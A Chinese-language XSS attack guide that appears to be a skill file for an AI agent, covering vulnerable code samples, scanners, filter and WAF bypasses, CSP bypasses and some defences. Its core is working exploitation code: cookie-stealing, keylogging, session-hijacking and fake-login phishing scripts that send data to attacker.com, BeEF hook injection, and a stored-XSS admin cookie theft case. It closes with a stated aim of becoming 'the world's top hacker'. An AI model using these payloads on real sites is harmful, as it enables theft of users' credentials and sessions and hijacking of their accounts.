---
name: xss
description: XSS跨站脚本攻击 - 包含反射型/存储型/DOM型、绕过技术、自动化工具、防御检测。用于Web渗透测试和前端安全。
---

# XSS跨站脚本攻击深度利用与防御

## 1. 漏洞概述

### 1.1 基本信息
- **漏洞名称**: 跨站脚本攻击 (Cross-Site Scripting, XSS)
- **CVE编号**: 通用漏洞，无特定CVE
- **严重程度**: High (CVSS 6.1-8.1)
- **影响范围**: 所有动态渲染用户输入的Web应用
- **利用难度**: 简单到中等

### 1.2 漏洞描述
XSS是一种客户端代码注入攻击，攻击者通过Web应用对用户输入的不当处理，在受害者浏览器中执行恶意JavaScript代码，从而窃取Cookie、劫持会话、执行钓鱼攻击。

### 1.3 XSS类型

| 类型 | 特点 | 持久性 | 危害程度 |
|------|------|--------|----------|
| **反射型** | URL参数直接输出 | 无 | 中 |
| **存储型** | 存储在服务器 | 永久 | 高 |
| **DOM型** | 客户端处理 | 无 | 中 |
| **突变型** | 浏览器解析差异 | 视情况 | 高 |

---

## 2. 技术原理

### 2.1 反射型XSS

```php
<?php
// 漏洞代码
$search = $_GET['q'];  // 直接获取用户输入
echo "搜索结果: " . $search;  // 直接输出，无编码
?>

// 攻击URL: ?q=<script>alert(document.cookie)</script>
// 实际输出: 搜索结果: <script>alert(document.cookie)</script>
```

### 2.2 存储型XSS

```php
<?php
// 漏洞代码：评论系统
$comment = $_POST['comment'];
// 存储到数据库
mysqli_query($conn, "INSERT INTO comments (content) VALUES ('$comment')");

// 显示评论时直接输出
$result = mysqli_query($conn, "SELECT content FROM comments");
while ($row = mysqli_fetch_assoc($result)) {
    echo "<div>" . $row['content'] . "</div>";  // 直接输出，无编码
}
?>

// 攻击payload存储在数据库，每次访问都会触发
```

### 2.3 DOM型XSS

```html
<!-- 漏洞代码：客户端处理 -->
<div id="output"></div>
<script>
// 直接从location.hash获取并插入DOM
var content = location.hash.substring(1);
document.getElementById('output').innerHTML = decodeURIComponent(content);
</script>

// 攻击URL: #<img src=x onerror=alert(1)>
```

### 2.4 数据流分析

```
[攻击者] → 恶意输入 → [服务器] → 存储到DB → [受害者访问] → 执行JS
                             ↓
                         [直接返回] → [受害者浏览器] → 执行JS
```

---

## 3. 漏洞识别

### 3.1 代码审计特征

```python
#!/usr/bin/env python3
"""
XSS代码审计脚本
检测潜在的危险模式
"""

import re
import os

# 危险模式
XSS_PATTERNS = {
    'php': [
        (r'echo\s+\$_(GET|POST|REQUEST)\s*\[', '直接输出用户输入'),
        (r'print\s+\$_(GET|POST|REQUEST)\s*\[', '直接打印用户输入'),
        (r'\.innerHTML\s*=\s*[^;]*location', 'DOM型XSS'),
        (r'document\.write\s*\(', '危险输出函数'),
    ],
    'javascript': [
        (r'innerHTML\s*=\s*', '直接设置innerHTML'),
        (r'document\.write\s*\(', '危险输出'),
        (r'eval\s*\(', '执行动态代码'),
        (r'setTimeout\s*\(\s*["\']', '动态执行'),
    ],
    'python': [
        (r'render_template_string\s*\(', '模板注入风险'),
        (r'Markup\s*\(', '不安全输出'),
    ]
}

def scan_file(filepath):
    """扫描单个文件"""
    results = []
    ext = os.path.splitext(filepath)[1].lower()
    lang = {'.php': 'php', '.js': 'javascript', '.py': 'python'}.get(ext)
    
    if not lang or lang not in XSS_PATTERNS:
        return results
    
    with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
        lines = f.readlines()
    
    for i, line in enumerate(lines, 1):
        for pattern, desc in XSS_PATTERNS[lang]:
            if re.search(pattern, line):
                results.append({
                    'file': filepath,
                    'line': i,
                    'code': line.strip(),
                    'issue': desc
                })
    
    return results

if __name__ == "__main__":
    import sys
    if len(sys.argv) > 1:
        results = scan_file(sys.argv[1])
        for r in results:
            print(f"[!] {r['file']}:{r['line']} - {r['issue']}")
            print(f"    {r['code']}")
```

### 3.2 自动化检测脚本

```python
#!/usr/bin/env python3
"""
XSS自动化检测脚本
用法: python xss_scanner.py http://target.com/search?q=test
"""

import sys
import requests
import urllib.parse
from concurrent.futures import ThreadPoolExecutor

# 测试payloads
XSS_PAYLOADS = [
    # 基础测试
    ("<script>alert(1)</script>", "基础script标签"),
    ("<img src=x onerror=alert(1)>", "img onerror"),
    ("<svg onload=alert(1)>", "svg onload"),
    ("'><script>alert(1)</script>", "单引号闭合"),
    ("\"><script>alert(1)</script>", "双引号闭合"),
    
    # 事件处理器
    ("<body onload=alert(1)>", "body onload"),
    ("<input onfocus=alert(1) autofocus>", "input autofocus"),
    ("<marquee onstart=alert(1)>", "marquee事件"),
    
    # 编码绕过
    ("<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>", "HTML实体编码"),
    ("%3Cscript%3Ealert(1)%3C/script%3E", "URL编码"),
    
    # 大小写混合
    ("<ScRiPt>alert(1)</sCrIpT>", "大小写混淆"),
    
    # 空白符
    ("<img/src=x/onerror=alert(1)>", "斜线替代空格"),
    
    # JavaScript协议
    ("<a href=\"javascript:alert(1)\">click</a>", "javascript协议"),
]

class XSSScanner:
    def __init__(self, url, threads=5):
        self.url = url
        self.results = []
        self.threads = threads
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0'
        })
        
    def test_payload(self, payload, description):
        """测试单个payload"""
        try:
            # 构造测试URL
            if '?' in self.url:
                test_url = self.url + payload
            else:
                test_url = self.url + '?q=' + urllib.parse.quote(payload)
            
            response = self.session.get(test_url, timeout=10)
            
            # 检查payload是否在响应中（未编码）
            if payload in response.text:
                return True, f"Payload直接反射: {description}"
            
            # 检查关键特征
            indicators = ['<script>', 'onerror=', 'onload=', 'javascript:']
            for ind in indicators:
                if ind in response.text.lower():
                    return True, f"发现XSS特征: {ind}"
            
            return False, ""
            
        except Exception as e:
            return False, str(e)
    
    def scan(self):
        """执行扫描"""
        print(f"[*] 目标: {self.url}")
        print(f"[*] 开始XSS扫描...")
        
        for payload, desc in XSS_PAYLOADS:
            print(f"[*] 测试: {desc}")
            vulnerable, result = self.test_payload(payload, desc)
            
            if vulnerable:
                print(f"[+] 发现漏洞! {result}")
                self.results.append({
                    "payload": payload,
                    "description": desc,
                    "result": result
                })
        
        return self.results

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("用法: python xss_scanner.py <目标URL>")
        sys.exit(1)
    
    scanner = XSSScanner(sys.argv[1])
    results = scanner.scan()
    
    if not results:
        print("[-] 未发现XSS漏洞")
    else:
        print(f"\n[+] 发现 {len(results)} 个XSS漏洞")
```

---

## 4. 利用技术

### 4.1 Cookie窃取

```javascript
// 基础窃取
<script>
fetch('http://attacker.com/steal?c=' + document.cookie)
</script>

// 带完整信息
<script>
var data = {
    cookies: document.cookie,
    url: location.href,
    userAgent: navigator.userAgent
};
fetch('http://attacker.com/log', {
    method: 'POST',
    body: JSON.stringify(data)
});
</script>

// 使用img标签（隐蔽）
<script>
new Image().src = 'http://attacker.com/steal?c=' + btoa(document.cookie);
</script>
```

### 4.2 键盘记录

```javascript
<script>
document.addEventListener('keypress', function(e) {
    var key = e.key;
    var target = e.target.name || e.target.id || 'unknown';
    
    fetch('http://attacker.com/keylog', {
        method: 'POST',
        body: JSON.stringify({
            key: key,
            target: target,
            timestamp: Date.now()
        })
    });
});
</script>
```

### 4.3 会话劫持

```javascript
<script>
// 发送请求到攻击者服务器
var xhr = new XMLHttpRequest();
xhr.open('GET', 'http://attacker.com/hijack?session=' + document.cookie, true);
xhr.send();

// 或使用fetch
fetch('http://attacker.com/hijack', {
    method: 'POST',
    credentials: 'include',
    body: document.cookie
});
</script>
```

### 4.4 钓鱼攻击

```javascript
<script>
// 创建伪造登录框
var overlay = document.createElement('div');
overlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:99999;';
overlay.innerHTML = `
<div style="background:white;padding:20px;margin:100px auto;width:300px;">
    <h3>会话已过期，请重新登录</h3>
    <input type="text" id="phish_user" placeholder="用户名"><br><br>
    <input type="password" id="phish_pass" placeholder="密码"><br><br>
    <button onclick="steal()">登录</button>
</div>
`;
document.body.appendChild(overlay);

function steal() {
    var user = document.getElementById('phish_user').value;
    var pass = document.getElementById('phish_pass').value;
    fetch('http://attacker.com/phish?u=' + user + '&p=' + pass);
}
</script>
```

### 4.5 BeEF框架集成

```html
<!-- 注入BeEF hook -->
<script src="http://attacker.com:3000/hook.js"></script>

<!-- 攻击者可通过BeEF控制受害者浏览器 -->
```

---

## 5. 场景适配

### 5.1 不同输出位置

| 位置 | 闭合方式 | 示例 |
|------|----------|------|
| **HTML标签内** | 闭合标签 | `</div><script>alert(1)</script>` |
| **属性值内** | 闭合属性 | `" onmouseover="alert(1)` |
| **JavaScript内** | 闭合脚本 | `';alert(1)//` |
| **URL参数内** | URL编码 | `%3Cscript%3Ealert(1)%3C/script%3E` |
| **CSS内** | CSS注入 | `expression(alert(1))` |

### 5.2 不同上下文

```html
<!-- 1. HTML上下文 -->
<div>USER_INPUT</div>
Payload: <script>alert(1)</script>

<!-- 2. 属性上下文 -->
<input value="USER_INPUT">
Payload: " onfocus="alert(1)" autofocus="

<!-- 3. JavaScript上下文 -->
<script>var x = "USER_INPUT";</script>
Payload: ";alert(1);//

<!-- 4. URL上下文 -->
<a href="USER_INPUT">Link</a>
Payload: javascript:alert(1)

<!-- 5. CSS上下文 -->
<div style="USER_INPUT">
Payload: background:url(javascript:alert(1))
```

### 5.3 不同浏览器

| 浏览器 | 特点 | 绕过技术 |
|--------|------|----------|
| **Chrome** | XSS Auditor | 编码、突变型XSS |
| **Firefox** | 无内置过滤 | 大部分payload有效 |
| **Safari** | 较弱过滤 | 标准payload |
| **IE/Edge** | XSS Filter | 特定编码绕过 |

---

## 6. 绕过技术

### 6.1 过滤绕过

| 过滤 | 绕过方式 | 示例 |
|------|----------|------|
| `<script>` | 事件处理器 | `<img src=x onerror=alert(1)>` |
| `alert()` | 编码 | `alert&#40;1&#41;` |
| `onerror` | 其他事件 | `onload`, `onfocus`, `onmouseover` |
| 空格 | 空白符 | `%09`, `%0a`, `%0d`, `/` |
| `()` | 反引号 | `<img src=x onerror=alert\`1\`>` |

### 6.2 编码绕过

```html
<!-- HTML实体编码 -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>

<!-- 十六进制编码 -->
<img src=x onerror=\x61\x6c\x65\x72\x74(1)>

<!-- Unicode编码 -->
<img src=x onerror=\u0061\u006c\u0065\u0072\u0074(1)>

<!-- URL编码 -->
%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E

<!-- 双重编码 -->
%253Cimg%2520src%253Dx%2520onerror%253Dalert(1)%253E
```

### 6.3 大小写混淆

```html
<ScRiPt>alert(1)</sCrIpT>
<IMG SRC=x OnErRoR=alert(1)>
<SVG/ONLOAD=alert(1)>
```

### 6.4 WAF绕过

```html
<!-- 注释干扰 -->
<script>al<!---->ert(1)</script>

<!-- 空白符 -->
<svg/onload=alert(1)>

<!-- 空字节 -->
<img src=x onerror=alert(1)>

<!-- 标签嵌套 -->
<scr<script>ipt>alert(1)</scr</script>ipt>

<!-- 编码组合 -->
<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>
```

### 6.5 CSP绕过

```html
<!-- 利用JSONP -->
<script src="https://target.com/api/jsonp?callback=alert(1)"></script>

<!-- 利用重定向 -->
<script src="https://target.com/redirect?url=javascript:alert(1)"></script>

<!-- 利用iframe -->
<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;">

<!-- 利用base标签 -->
<base href="http://attacker.com/">
<script src="/malicious.js"></script>
```

---

## 7. 防御与检测

### 7.1 输出编码

```python
# Python Flask
from flask import escape

@app.route('/search')
def search():
    query = request.args.get('q', '')
    safe_query = escape(query)  # HTML编码
    return f"搜索结果: {safe_query}"

# 前端JavaScript
function safeOutput(input) {
    const div = document.createElement('div');
    div.textContent = input;  // 自动编码
    return div.innerHTML;
}

// 手动编码
function htmlEncode(str) {
    return str.replace(/[&<>'"]/g, function(tag) {
        const chars = {
            '&': '&amp;',
            '<': '&lt;',
            '>': '&gt;',
            "'": '&#39;',
            '"': '&quot;'
        };
        return chars[tag];
    });
}
```

### 7.2 HTTP头设置

```python
# Flask
@app.after_request
def set_headers(response):
    # CSP
    response.headers['Content-Security-Policy'] = "default-src 'self'; script-src 'self' 'unsafe-inline'"
    
    # XSS保护
    response.headers['X-XSS-Protection'] = '1; mode=block'
    
    # 禁止MIME类型嗅探
    response.headers['X-Content-Type-Options'] = 'nosniff'
    
    return response
```

```
# Nginx配置
add_header Content-Security-Policy "default-src 'self'";
add_header X-XSS-Protection "1; mode=block";
add_header X-Content-Type-Options "nosniff";
```

### 7.3 HttpOnly Cookie

```python
# Flask
from flask import make_response

@app.route('/login')
def login():
    resp = make_response('Logged in')
    resp.set_cookie('session', 'secret_token', httponly=True, secure=True, samesite='Strict')
    return resp
```

```php
// PHP
setcookie('session', $token, time()+3600, '/', '', true, true);
//                                                         ↑     ↑
//                                                      secure httponly
```

### 7.4 输入验证

```javascript
// 白名单验证
function validateInput(input) {
    // 只允许字母数字
    const allowed = /^[a-zA-Z0-9]+$/;
    return allowed.test(input);
}

// 长度限制
if (input.length > 100) {
    throw new Error('Input too long');
}

// 特定格式验证
function validateEmail(email) {
    const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return re.test(email);
}
```

---

## 8. 自动化工具

### 8.1 XSStrike

```bash
# 基础扫描
python xsstrike.py -u "http://target.com/search?q=test"

# 指定参数
python xsstrike.py -u "http://target.com/search" --data "q=test"

# 使用代理
python xsstrike.py -u "http://target.com/search?q=test" --proxy "http://127.0.0.1:8080"

# 爬虫模式
python xsstrike.py -u "http://target.com" --crawl
```

### 8.2 Dalfox

```bash
# 基础扫描
dalfox url "http://target.com/search?q=test"

# 管道模式
dalfox pipe "http://target.com" | grep XSS

# 文件模式
dalfox file urls.txt

# 自定义payload
dalfox url "http://target.com" --payload payloads.txt
```

### 8.3 BeEF框架

```bash
# 启动BeEF
cd /opt/beef
./beef

# 配置hook URL
# config.yaml
beef:
    http:
        host: "0.0.0.0"
        port: 3000

# 注入hook
<script src="http://attacker.com:3000/hook.js"></script>
```

---

## 9. 实战案例

### 9.1 存储型XSS案例

**目标**: 论坛评论系统

**发现**:
1. 评论内容未过滤直接存储
2. 管理员后台直接显示评论

**利用**:
```html
<!-- 评论内容 -->
<img src=x onerror="
fetch('http://attacker.com/steal?c='+document.cookie+'&admin=true')
">
```

**结果**: 管理员查看评论时Cookie被窃取

### 9.2 DOM型XSS案例

**目标**: 单页应用hash路由

**漏洞代码**:
```javascript
// 路由处理
var page = location.hash.substring(1);
document.getElementById('content').innerHTML = page;
```

**利用URL**:
```
http://target.com/#<img src=x onerror=alert(1)>
```

### 9.3 CSP绕过案例

**目标**: 有CSP保护的站点

**CSP规则**:
```
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.com
```

**绕过**: 发现trusted.com有JSONP接口
```html
<script src="https://trusted.com/api?callback=alert(1)"></script>
```

---

## 10. 参考资源

### 10.1 学习资源
- [OWASP XSS](https://owasp.org/www-community/attacks/xss/)
- [PortSwigger XSS](https://portswigger.net/web-security/cross-site-scripting)
- [XSS Game](https://xss-game.appspot.com/)

### 10.2 靶场
- XSS Game
- PortSwigger Academy
- DVWA
- bWAPP

### 10.3 工具
- XSStrike
- Dalfox
- BeEF
- BruteXSS

---

*目标: 成为世界第一黑客 + AI安全专家*
*类型: Web安全*
